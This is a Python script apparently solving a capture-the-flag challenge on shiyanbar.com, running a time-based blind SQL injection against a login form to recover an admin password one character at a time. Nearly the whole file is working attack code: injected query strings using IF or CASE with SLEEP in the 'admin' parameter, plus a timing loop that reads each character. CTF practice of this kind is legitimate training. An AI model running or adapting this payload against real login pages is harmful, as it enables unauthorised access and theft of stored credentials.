"""
http://www.shiyanbar.com/ctf/2

"""
import time
import string
import requests


def find_pwd():
    session = requests.Session()
    session.headers[
        "User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
    session.headers["Host"] = "ctf5.shiyanbar.com"

    sleep_len = 5
    password = ""

    chars = 'abcdefghijklmnopqrstuvwxyz0123456789@_.{}-'  # 不区分大小写
    url = "http://ctf5.shiyanbar.com/basic/inject/index.php"
    for i in range(1, 50):
        for c in chars:
            ts = time.time()
            url = "http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin' and case when(substr(password,{idx},1)='{char}') then sleep({sleep_len}) else sleep(0) end and ''='&pass=&action=login"\
                .format(idx=i, char=c, sleep_len=sleep_len)

            url = "http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin' and if(substr(password,{idx},1)='{char}', sleep({sleep_len}), 1) and ''='&pass=&action=login"\
                .format(idx=i, char=c, sleep_len=sleep_len)
            res = session.get(url)
            if time.time() - ts > sleep_len:
                password += c
                print('password is: ', password)
                break
            if c == chars[-1]:
                print("到尾了")
                return password
    return password


pwd = find_pwd()

print(pwd)
